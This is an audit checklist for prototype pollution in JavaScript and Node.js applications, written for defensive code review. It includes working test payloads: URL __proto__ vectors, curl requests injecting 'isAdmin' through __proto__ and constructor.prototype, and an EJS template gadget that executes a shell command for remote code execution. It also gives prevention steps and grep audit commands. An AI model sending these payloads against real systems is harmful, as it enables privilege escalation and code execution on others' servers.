# Prototype Pollution Audit (JavaScript/Node.js)

Based on MITRE ATT&CK T1190, T1059.007 and OWASP Top 10 A03:2021.

## When to Use

- After adding deep merge/clone/extend operations
- When processing user-controlled JSON objects
- During code review of object manipulation utilities

## Attacks to Test

### 1. Client-Side Prototype Pollution (DOM XSS)

```javascript
// Test URL-based pollution
// Navigate to: http://target.com/?__proto__[polluted]=true
console.log(({}).polluted); // If "true", pollution confirmed

// Common vectors:
// ?__proto__[key]=value
// ?constructor[prototype][key]=value
// #__proto__[key]=value
```

### 2. Server-Side Prototype Pollution

```bash
# Test via __proto__
curl -X POST https://target/api/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"isAdmin": true}}'

# Test via constructor.prototype
curl -X POST https://target/api/update \
  -H "Content-Type: application/json" \
  -d '{"constructor": {"prototype": {"isAdmin": true}}}'

# Detection via status code reflection
curl -X POST https://target/api/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"status": 510}}'
# If response returns 510, server-side pollution confirmed
```

### 3. RCE via Template Engine Gadgets

```bash
# EJS template gadget
curl -X POST https://target/api/update \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"client": true, "escapeFunction": "JSON.stringify; process.mainModule.require(\"child_process\").execSync(\"id\")"}}'
```

## Checklist

### Prevention

- [ ] Use `Object.create(null)` for config objects (no prototype)
- [ ] Freeze `Object.prototype` if feasible
- [ ] Sanitize `__proto__` and `constructor` keys in user input
- [ ] Use `Map` instead of plain objects for user-controlled data
- [ ] Validate input schema before processing

### Code Patterns to Audit

```bash
# Find deep merge/clone operations
grep -rn "Object\.assign\|\.merge\|\.extend\|deepMerge\|cloneDeep\|spread\|\.\.\." apps/ --include="*.ts" --include="*.tsx" | head -20

# Find __proto__ handling
grep -rn "__proto__\|constructor\[.prototype.\]" apps/ --include="*.ts"

# Find template rendering with user input
grep -rn "render\|template\|ejs\|pug\|handlebars" apps/be/src/ --include="*.ts" | head -10
```

### Vulnerable npm Packages

```bash
# Check for known-vulnerable merge/clone packages
npm ls lodash merge-deep deepmerge extend hapi-utils
# Replace with safe alternatives or patch
```

## References

- Source: Anthropic-Cybersecurity-Skills `exploiting-prototype-pollution-in-javascript`
- PortSwigger: https://portswigger.net/web-security/prototype-pollution
